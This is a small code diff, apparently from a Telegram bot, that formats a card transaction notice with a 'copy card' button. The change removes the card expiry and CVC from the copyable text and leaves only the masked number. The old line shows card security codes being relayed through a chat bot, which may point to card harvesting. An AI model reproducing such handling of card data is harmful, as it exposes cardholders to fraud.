@@ -80,7 +80,7 @@ ${cardType}
 📋 <b>Transaction Type:</b> ${serviceLabel}
 `.trim();
 
-    const copyText = `${maskedCard}\n${expiry || "—"}\n${cvc || "—"}`;
+    const copyText = maskedCard;
     const replyMarkup = {
       inline_keyboard: [[{ text: "📋 نسخ البطاقة", copy_text: { text: copyText } }]],
     };
